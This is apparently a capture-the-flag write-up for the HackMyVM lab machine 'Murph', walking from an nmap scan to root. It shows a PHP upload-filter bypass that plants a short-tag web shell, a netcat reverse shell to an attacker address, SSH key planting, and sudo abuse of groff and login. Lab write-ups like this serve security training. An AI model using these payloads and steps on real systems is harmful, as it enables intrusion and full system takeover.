# Murph

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.198:22
Open 10.0.2.198:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.198
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 b2:c9:f2:72:7a:ad:71:52:df:9b:31:b1:a9:87:dc:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDjURCUwSIC+Oq3kJ4p/OUp7bncdSokoTV85nFRZqmetVCiV09AmoALwjahVlJKeGA0RH01/5XAlkK8B8DkORAzLb1Kk2GNswOUQgUqsCXQCuQJgjywKSrZMtIdqymPne7RD5wc+5/7bdsVaKqrCib+Hg3kw1r69egF2qxo1opG1obJAkwFHt5qEcj8cxZ+wA3noYThY/9OttDatSNCpSDkO0s30W8vaZ1Z60VdPiUUczpruI41ZraLc12Ar7fP+eSHT9xpGm54hOdkCYCxILMHfNJPtfE7/8gCzgQnV5bvOOyXouYxR+LzExSGVIn9NoDUCgxDl1I/71k6A9M4ZmoTYuMIS4WOX9E2SKct7d2utIKh0p15e0n/obxjW6x6OSN3D+4Rd29Gu4KDmSPubwIJ4Y22UQTn1/lntp5H8TAslrFaV5cucGeYj69j5t3a9kKAw1VYi+WinfF6F9wXeoOMmHVfvXlE3pAaNW3Lycpb9qyvUABMofNwVfery/OEzR8=
|   256 e9:73:af:55:81:50:2b:13:4c:fe:92:31:c4:b7:ae:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPUj0iSckg9BD0tTAVU8FExadNAUwL83hLJ8CZdfCl8fmxb4/ds2xqo+srWIyqy0kaptDruRv2WURGuZ/T3pKLo=
|   256 ad:c1:58:71:0e:fc:c8:9e:86:9c:c7:3f:85:be:2d:c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVSbMNpnVYxLdTEE76L4RTmmYeoBWtDN4/TlYzSZFvK
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/murph/writeup.png)

PHP seems protected
```bash
└─$ curl 'http://10.0.2.198/saveit.php' -G -d 'filename=t.phtml' --data-urlencode 'content=<?php phpinfo();?>' -i

└─$ curl http://10.0.2.198/uploads/t.phtml
<?wtf wtfinfo();?> 
```

Short tags work as bypass
```bash
└─$ curl 'http://10.0.2.198/saveit.php' -G -d 'filename=t.phtml' --data-urlencode 'content=<?=`$_REQUEST[0]`?>'

└─$ curl 'http://10.0.2.198/uploads/t.phtml?0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ curl 'http://10.0.2.198/uploads/t.phtml' --data-urlencode '0=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@murph:~/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The filename was also replacing `php`, lucky I use `phtml` :D
```bash
www-data@murph:~/html$ cat saveit.php
<?php
$filewhat = $_GET['filename'];
$contentwhat = $_GET['content'];

$filewhat2 = str_replace("php","wtf",$filewhat);
$contentwhat2 = str_replace("php","wtf",$contentwhat);

$fp = fopen("/var/www/html/uploads/".$filewhat2, 'w');
fwrite($fp, $contentwhat2);
fclose($fp);
?>
```

## Lateral Movement (jen)

```bash
www-data@murph:~/html$ find / -perm -4000 -ls 2>/dev/null
   139394     20 -rwsr-sr-x   1 root     www-data    16896 May 31  2022 /opt/murph
   137295     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   268830    472 -rwsr-xr-x   1 root     root         481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
      106     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
     4122     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
     3755     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
      107     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
      110     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
    17741    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
      109     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
     3596     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
     4124     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
```

```bash
www-data@murph:~/html$ /opt/murph
Waiting SIGUSR1....
^C
```

Send the signal it wants?
```bash
www-data@murph:~$ /opt/murph & # Background process
Waiting SIGUSR1....
[1] 622
www-data@murph:~$ kill -SIGUSR1 622 # Send signal
www-data@murph:~$ %1 # Foreground process
/opt/murph
jen@murph:~$ id
uid=1000(jen) gid=33(www-data) groups=33(www-data)
```

### SSH

```bash
└─$ gen_ssh_deploy id_rsa jen
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/jen/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJn13mt8YBE6kXKq3GjtHnI01sjGzJNXUQbo4HKUrRqC woyag@kraken' >> /home/jen/.ssh/authorized_keys ; chmod 700 /home/jen/.ssh ; chmod 600 /home/jen/.ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa jen@10.0.2.198
jen@murph:~$ id
uid=1000(jen) gid=1000(jen) grupos=1000(jen),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

### User.txt

```
jen@murph:~$ cat user.txt
HMVkwXxGPGcaoPNKkH
```

## Privilege Escalation (pat)

```
jen@murph:~$ sudo -l
Matching Defaults entries for jen on murph:
    env_reset, mail_badpass, secure_path=.\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jen may run the following commands on murph:
    (pat) NOPASSWD: /usr/bin/groff
```

```bash
jen@murph:~$ echo '.sy /bin/bash -p -c "id > /tmp/id"' | sudo -u pat /usr/bin/groff -U
jen@murph:~$ cat /tmp/id
uid=1001(pat) gid=1001(pat) grupos=1001(pat)
```

```bash
└─$ gen_ssh_deploy id_rsa pat
[+] Remote command to run:
mkdir -p /home/pat/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJn13mt8YBE6kXKq3GjtHnI01sjGzJNXUQbo4HKUrRqC woyag@kraken' >> /home/pat/.ssh/authorized_keys ; chmod 700 /home/pat/.ssh ; chmod 600 /home/pat/.ssh/authorized_keys
```

```bash
jen@murph:~$ echo "REMOTE_COMMAND" > /tmp/deploy
jen@murph:~$ chmod +x /tmp/deploy
jen@murph:~$ echo '.sy /tmp/deploy' | sudo -u pat /usr/bin/groff -U
---
└─$ ssh -i id_rsa pat@10.0.2.198
pat@murph:~$ id
uid=1001(pat) gid=1001(pat) grupos=1001(pat)
```

## Privilege Escalation (root)

```bash
pat@murph:~$ sudo -l
Matching Defaults entries for pat on murph:
    env_reset, mail_badpass, secure_path=.\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pat may run the following commands on murph:
    (root) NOPASSWD: /usr/bin/login
```

```bash
pat@murph:~$ sudo /usr/bin/login -f root
root@murph:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Root.txt

```
root@murph:~# cat root.txt
HMVRzKuifxeTnsjOpt
```